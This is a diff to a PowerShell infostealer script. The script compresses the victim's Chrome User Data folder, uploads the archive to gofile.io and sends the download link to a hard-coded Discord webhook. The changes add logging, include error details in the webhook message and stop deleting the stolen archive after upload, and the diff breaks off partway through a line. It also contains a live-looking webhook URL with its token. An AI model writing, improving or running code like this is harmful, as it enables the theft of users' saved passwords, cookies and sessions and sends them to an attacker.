@@ -1,5 +1,5 @@
 # $botToken = "bot_token"
-# $chatID = "chat_id" 
+# $chatID = "chat_id"
 $webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"
 
 # Function for sending messages through Telegram Bot
@@ -93,12 +93,17 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
+# Log the existence of chrome path
+Write-Host "Chrome path found: $chromePath"
+
 # Create a zip of the Chrome User Data using the built-in Compress-Archive cmdlet
 $outputZip = "$env:TEMP\chrome_data.zip"
 try {
+    Write-Host "Attempting to compress data at: $chromePath"
     Compress-Archive -Path $chromePath -DestinationPath $outputZip
+    Write-Host "Compression successful, file saved at: $outputZip"
 } catch {
-    Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
+    Send-DiscordMessage -message "Error creating zip file with Compress-Archive: $_"
     exit
 }
 
@@ -109,8 +114,4 @@ $link = Upload-FileAndGetLink -filePath $outputZip
 if ($link -ne $null) {
     Send-DiscordMessage -message "Download link: $link"
 } else {
-    Send-DiscordMessage -message "Failed to upload file to gofile.io"
-}
-
-# Remove the zip file after uploading
-Remove-Item $outputZip
+    Send-DiscordMessage -message "
